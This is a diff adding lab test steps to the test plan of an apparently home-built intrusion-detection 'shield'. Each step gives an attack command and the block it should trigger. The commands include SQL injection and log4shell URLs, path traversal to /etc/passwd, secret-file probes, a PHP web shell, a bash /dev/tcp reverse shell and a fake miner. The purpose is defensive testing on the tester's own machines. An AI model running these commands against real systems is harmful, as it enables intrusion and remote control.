@@ -45,3 +45,20 @@ Phones cannot run the shield itself. They are attackers and viewers. Say so; it 
 - Ransomware is a mock inside the sample folder; real-sample testing was done only in an isolated VM (if you do it).
 - Windows support is implemented and tested with simulated commands; real-machine results come from laptop 5.
 - Phones are attackers/viewers only; no DDoS beyond the host's own capacity is claimed.
+
+## v13.20 to v13.25 additions (web, host, node attacks, alerts, report)
+Extra `config.env` keys for these steps: `WEB_GUARD=1`, `HOST_GUARD=1`, `BLOCK_TTL=45` (a laptop can be attacked again after 45 s), `ALERT_TELEGRAM_TOKEN`/`ALERT_TELEGRAM_CHAT` (phone alert; test with `python3 multi/alert_notify.py --test`).
+With `PRODUCTION=1` the demo ransomware button needs `AGENT_DEMO=1` on T (restart T after setting it); it WIPES the vault: remove it after the demo.
+Install nginx on T first (`sudo apt install -y nginx`) and put a page in `/var/www/html`. In the commands below `$T_IP` is T's address.
+| # | Who | Do | Expected |
+|---|---|---|---|
+| 14 | A2 | `curl -s -o /dev/null "http://$T_IP/item?id=1%20UNION%20SELECT%20user,pass%20FROM%20users"` | SQL injection: A2 blocked at once; Attack events tab shows web attack sqli |
+| 15 | A | `for p in .env .git/config backup.zip shell.php; do curl -s -o /dev/null http://$T_IP/$p; done` and `curl -s -o /dev/null -A sqlmap http://$T_IP/` | probes and scanner score add up to a block |
+| 16 | A2 | `curl -s -o /dev/null --path-as-is "http://$T_IP/f?p=../../../etc/passwd"` and a log4shell URL `/r?c=%24%7Bjndi%3Aldap%3A%2F%2Fx.example%2Fa%7D` | traversal and log4shell blocked |
+| 17 | T | `echo HACKED | sudo tee /var/www/html/index.html` and `echo '<?php echo 1;?>' | sudo tee /var/www/html/shell.php` | page restored from the clean snapshot; web shell quarantined |
+| 18 | A2, then T | A2: `nc -lvnp 4444`; T (new terminal): `bash -i >& /dev/tcp/A2_IP/4444 0>&1` | reverse shell killed, A2 blocked (HOST_ATTACK) |
+| 19 | T | `cp /bin/sleep /tmp/xmrig && /tmp/xmrig 600 &` | harmless copy named like a miner: killed and quarantined |
+| 20 | T | `python3 -m http.server 8999 &` then kill it | node_watch: new listening port alert within about a minute |
+| 21 | D | Attack events tab, button **Incident report (print / PDF)** | one printable report of steps 14 to 20 |
+| 22 | phone | Telegram | alerts for the events above (only severity `ALERT_MIN` and higher) |
+Order tip: web and host attacks block the source address; alternate A and A2, or wait `BLOCK_TTL` seconds.
